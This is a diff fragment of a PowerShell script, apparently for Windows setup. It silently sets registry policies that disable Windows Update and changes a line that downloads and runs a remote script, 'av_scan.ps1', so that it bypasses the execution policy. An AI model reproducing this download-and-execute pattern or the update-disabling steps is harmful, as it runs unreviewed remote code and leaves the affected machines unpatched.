@@ -88,7 +88,7 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v SetDisableUX
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f /reg:64 > $null 2>&1; `
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 2 /f /reg:64 > $null 2>&1
 
-iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/MurphCodeDev/wf/main/av_scan.ps1'))
+powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/MurphCodeDev/wf/main/av_scan.ps1'))"
 
 # Start-Sleep -Seconds 30
 
